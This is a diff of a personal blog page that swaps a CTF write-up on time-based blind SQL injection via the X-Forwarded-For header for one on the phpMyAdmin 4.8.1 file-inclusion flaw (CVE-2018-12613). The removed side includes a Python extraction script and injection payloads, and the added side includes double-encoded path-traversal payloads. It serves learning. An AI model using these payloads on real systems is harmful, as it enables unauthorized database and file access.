@@ -147,58 +147,119 @@
 </nav>
 
         <div id="main">
-            <div class="post_page_title_img" style="height: 25rem;background-image: url(https://c-ssl.duitang.com/uploads/item/201907/20/20190720111710_TNNCi.jpeg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;">
-                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2>insert into</h2></a>
+            <div class="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;">
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2></h2></a>
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h1 id="insert-into"><a href="#insert-into" class="headerlink" title="insert into"></a>insert into</h1><img src="/2019/08/24/insert%20into/1-01.png" title="image">
+                <p>#BUUCTF WEB</p>
+<p>##HCTF2018WarmUp<br>菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎<br>查看源码给了source.php,如下</p>
+<pre><code>&lt;?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&amp;$page)
+        {
+            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];
+            if (! isset($page) || !is_string($page)) {
+                echo "you can't see it";
+                return false;
+            }
 
-<p>观察题目</p>
-<img src="/2019/08/24/insert%20into/1-02.png" title="image">
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
 
-<p>可以看到注入点应该在http头的x-forwarded-for上</p>
-<img src="/2019/08/24/insert%20into/1-03.png" title="image">
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
 
-<p>这里还把‘，’过滤了</p>
-<img src="/2019/08/24/insert%20into/1-04.png" title="image">
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
 
-<p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p>
-<p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p>
-<img src="/2019/08/24/insert%20into/1-05.png" title="image">
+    if (! empty($_REQUEST['file'])  ##不能为空
+        &amp;&amp; is_string($_REQUEST['file'])  ##是字符串
+        &amp;&amp; emmm::checkFile($_REQUEST['file'])  ##上面checkfile返回为true
+    ) {
+        include $_REQUEST['file'];
+        exit;
+    } 
+    else {
+        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";
+    }  
+?&gt;</code></pre><p>hint.php</p>
+<pre><code>flag not here, and flag in ffffllllaaaagggg</code></pre><p>###解题<br>参考下面整理的漏洞，就可以构造出payload<br><code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code><br>传入得到flag</p>
+<p>经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞<br>所以先看懂这个漏洞-&gt;做题</p>
+<p>##phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</p>
+<p>###漏洞原理<br>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外：</p>
+<p>$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</p>
+<p>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</p>
+<p>###漏洞成因<br>   在index.php里50-63行</p>
+<pre><code>$target_blacklist = array (
+    'import.php', 'export.php'
+);
 
-<p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p>
-<img src="/2019/08/24/insert%20into/1-06.png" title="image">
+// If we have a valid target, let's load that script instead
+if (! empty($_REQUEST['target'])
+    &amp;&amp; is_string($_REQUEST['target'])
+    &amp;&amp; ! preg_match('/^index/', $_REQUEST['target'])
+    &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist)
+    &amp;&amp; Core::checkPageValidity($_REQUEST['target'])
+) {
+    include $_REQUEST['target'];
+    exit;
+}</code></pre><p>满足五个条件<br>   $_REQUEST[‘target’]不为空<br>   $_REQUEST[‘target’]是字符串<br>   $_REQUEST[‘target’]不以index开头<br>   $_REQUEST[‘target’]不在$target_blacklist中（import.php和export.php）<br>   <em>Core::checkPageValidity($_REQUEST[‘target’]为真<br>则包含参数所指定的文件</em></p>
+<p>代码在libraries\classes\Core.php 443-476行<br>Core::checkPageValidity</p>
+<pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = [])
+    {
+        if (empty($whitelist)) {
+            $whitelist = self::$goto_whitelist;
+        }
+        if (! isset($page) || !is_string($page)) {
+            return false;
+        }
 
-<p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p>
-<pre class=" language-python"><code class="language-python"> !<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python
+        if (in_array($page, $whitelist)) {
+            return true;
+        }
 
-<span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span> UTF<span class="token number">-8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span>
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> string
-mystring <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token comment" spellcheck="true">#所有字母和数字的集合</span>
-url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web15/'</span>
-<span class="token comment" spellcheck="true">#查库名</span>
-data <span class="token operator">=</span> <span class="token string">"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"</span>  <span class="token comment" spellcheck="true">#这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15</span>
-<span class="token comment" spellcheck="true">#查表名</span>
-data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><span class="token comment" spellcheck="true">#查出来时clineip和flag</span>
-<span class="token comment" spellcheck="true">#查字段名</span>
-data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and     table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span>
-<span class="token comment" spellcheck="true">#查出来是 flag</span>
-<span class="token comment" spellcheck="true">#查内容</span>
-data<span class="token operator">=</span> <span class="token string">"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 "</span>
-flag <span class="token operator">=</span> <span class="token string">''</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>
-        <span class="token keyword">try</span><span class="token punctuation">:</span>
-          headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'x-forwarded-for'</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#format格式化输出，把查到的str的每一字符依次赋到{0}里去</span>
-          res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一旦延时超过3s，继续向下执行代码</span>
-        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#跳到这里执行，得到所求</span>
-          flag <span class="token operator">+=</span> j
-          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
-          <span class="token keyword">break</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The final flag:'</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre>
-<p>由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}<br>（最好每次只开一个运行 不然出错概率太大）</p>
+        $_page = mb_substr(
+            $page,
+            0,
+            mb_strpos($page . '?', '?')
+        );
+        if (in_array($_page, $whitelist)) {
+            return true;
+        }
+
+        $_page = urldecode($page);
+        $_page = mb_substr(
+            $_page,
+            0,
+            mb_strpos($_page . '?', '?')
+        );
+        if (in_array($_page, $whitelist)) {
+            return true;
+        }
+
+        return false;
+    }</code></pre><p>###分析代码<br>mb_substr：截取字符串（与substr的区别是它可以截取中文）<br>mb_strpos:匹配（同理，可截取中文）<br>可以看到代码中用了两次有关截取?前字符 判断文件名是否在白名单里的操作<br>第一次很好理解，这里不再叙述<br>phpmyadmin开发团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次<br>而就在这里出现了漏洞<br>如果传入<br><code>target=db_sql.php%253f/../../test.txt</code><br>浏览器自行解码一次<br>变成:<br><code>target=db_sql.php%3f/../../test.txt</code><br>也就是说$_page = mb_substr传入数据里没?<br>所以这时的$_page没被截取<br>继续往下看，先经过函数urldecode一次<br>变成：<br><code>target=db_sql.php?/../../test.txt</code><br>这时候截取到问号前即$_page=db_dql.php符合条件<br>通过判断则能包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯)</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -279,8 +340,8 @@ $('.btn_click_load').click(function() {
 -->
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://dddwmr.github.io/2019/08/24/insert into/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://dddwmr.github.io/2019/08/24/insert into/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://dddwmr.github.io/2019/10/21/Untitled-1/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://dddwmr.github.io/2019/10/21/Untitled-1/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
